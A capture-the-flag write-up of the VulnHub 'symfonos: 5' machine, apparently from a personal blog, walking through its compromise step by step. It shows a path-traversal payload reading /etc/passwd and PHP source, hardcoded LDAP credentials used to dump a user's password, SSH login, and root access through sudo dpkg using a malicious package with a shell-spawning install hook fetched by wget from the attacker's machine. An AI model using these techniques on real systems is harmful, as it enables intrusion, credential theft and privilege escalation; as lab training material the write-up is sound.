# Vulnhub | symfonos: 5 Writeup

One more great symfonos box, that taught me something new! You can download the machine from here : [link](https://www.vulnhub.com/entry/symfonos-5,415/)

Table of contents :
+ 0x01 Enumeration
+ 0x02 Exploitation
+ 0x03 Privilege Escalation

# 0x01 Enumeration

As always we start with a nmap scan.

```
[root@pwn4magic]:~/Desktop# nmap -sC -sV -p- 192.168.1.13
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-12 23:51 EET
Nmap scan report for symfonos5.zte.com.cn (192.168.1.13)
Host is up (0.00015s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
MAC Address: 00:0C:29:9F:94:5E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hmm.. LDAP interesting, mb will be userful later! Let's continue by enumerating the webserver. Let's run a gobuster scan.

```
[root@pwn4magic]:~/Desktop# gobuster dir -q -u http://192.168.1.13/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php,.txt
/home.php (Status: 302)
/static (Status: 301)
/admin.php (Status: 200)
/logout.php (Status: 302)
/portraits.php (Status: 200)
/server-status (Status: 403)
```

Alright, i tried some stuff on `/admin.php` but nothing useful. `/home.php` is the key. `/home.php` redirects you to `/admin.php` so we'll use CURL to bypass that.

```html
[root@pwn4magic]:~/Desktop# curl --path-as-is http://192.168.1.13/home.php
<html>
<head>
<link rel="stylesheet" type="text/css" href="/static/bootstrap.min.css">
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <a class="navbar-brand" href="home.php">symfonos</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarColor02">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item">
        <a class="nav-link" href="home.php">Home</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="home.php?url=http://127.0.0.1/portraits.php">Portraits</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="logout.php">Logout</a>
      </li>
    </ul>
  </div>
</nav><br />
<center>
<h3>Under Developement</h3></center>
</body>
```

We can see this `home.php?url=http://127.0.0.1/portraits.php` parameter. Let's try LFI.

```
[root@pwn4magic]:~/Desktop# curl --path-as-is http://192.168.1.13/home.php?url=../../../../etc/passwd
---HTML SHITS------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</center>
</body>
```

No users that's weird.. let's try to read admin.php source code.

```php
[root@pwn4magic]:~/Desktop# curl --path-as-is http://192.168.1.13/home.php?url=../../../../var/www/html/admin.php
----HTML SHITS----
<?php
session_start();

if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: home.php");
    exit;
}

function authLdap($username, $password) {
  $ldap_ch = ldap_connect("ldap://172.18.0.22");

  ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3);

  if (!$ldap_ch) {
    return FALSE;
  }

  $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");

  if (!$bind) {
    return FALSE;
  }

  $filter = "(&(uid=$username)(userPassword=$password))";
  $result = ldap_search($ldap_ch, "dc=symfonos,dc=local", $filter);

  if (!$result) {
    return FALSE;
  }

  $info = ldap_get_entries($ldap_ch, $result);

  if (!($info) || ($info["count"] == 0)) {
    return FALSE;
  }

  return TRUE;

}

if(isset($_GET['username']) && isset($_GET['password'])){

$username = urldecode($_GET['username']);
$password = urldecode($_GET['password']);

$bIsAuth = authLdap($username, $password);

if (! $bIsAuth ) {
	$msg = "Invalid login";
} else {
        $_SESSION["loggedin"] = true;
	header("location: home.php");
	exit;
}
}
?>
```

Bingo! Some creds ``` $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");```.

LDAP is a database to keep all information related to user accounts, keeps a list of users. Some Terminology :
+ cn = Common Name
+ dc = Domain Component

Let's enumerate LDAP now. I didn't know how to do that, glad for my google-fu skillz. I found this really interesting [link](https://nmap.org/nsedoc/scripts/ldap-search.html).

I did some edit on CMD & bingo got a new user/password!

```
[root@pwn4magic]:~/Desktop# nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local",ldap.password=qMDdyZh3cT6eeAWD' 192.168.1.13
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 00:25 EET
Nmap scan report for symfonos5.zte.com.cn (192.168.1.13)
Host is up (0.00026s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=symfonos,dc=local
|     dn: dc=symfonos,dc=local
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: symfonos
|         dc: symfonos
|     dn: cn=admin,dc=symfonos,dc=local
|         objectClass: simpleSecurityObject
|         objectClass: organizationalRole
|         cn: admin
|         description: LDAP administrator
|         userPassword: {SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm
|     dn: uid=zeus,dc=symfonos,dc=local
|         uid: zeus
|         cn: zeus
|         sn: 3
|         objectClass: top
|         objectClass: posixAccount
|         objectClass: inetOrgPerson
|         loginShell: /bin/bash
|         homeDirectory: /home/zeus
|         uidNumber: 14583102
|         gidNumber: 14564100
|         userPassword: cetkKf4wCuHC9FET
|         mail: zeus@symfonos.local
|_        gecos: Zeus User
```

`zeus/cetkKf4wCuHC9FET` Let's try to SSH now.

# 0x02 Exploitation

```
[root@pwn4magic]:~/Desktop# ssh zeus@192.168.1.13
zeus@192.168.1.13's password: 
Linux symfonos5 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jan 12 09:03:07 2020 from 192.168.1.14
zeus@symfonos5:~$ whoami
zeus
```

Perfect.

# 0x03 Privilege Escalation

Let's check `sudo -l`.

```
zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
```

We can run `dpkg` as root perfect. I followed [gtfobins](https://gtfobins.github.io/gtfobins/dpkg/) page.

From my machine i did this :
```
[root@pwn4magic]:~/Desktop# TF=$(mktemp -d)
[root@pwn4magic]:~/Desktop# echo 'exec /bin/sh' > $TF/x.sh
[root@pwn4magic]:~/Desktop# fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
Debian packaging tools generally labels all files in /etc as config files, as mandated by policy, so fpm defaults to this behavior for deb packages. You can disable this default behavior with --deb-no-default-config-files flag {:level=>:warn}
Created package {:path=>"x_1.0_all.deb"}
[root@pwn4magic]:~/Desktop# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Now let's wget it and execute it.

```
zeus@symfonos5:/tmp$ cd /tmp
zeus@symfonos5:/tmp$ wget -q 192.168.1.14/x_1.0_all.deb
zeus@symfonos5:/tmp$ sudo dpkg -i x_1.0_all.deb
(Reading database ... 53057 files and directories currently installed.)
Preparing to unpack x_1.0_all.deb ...
# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
# 
```

ROOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOTED.
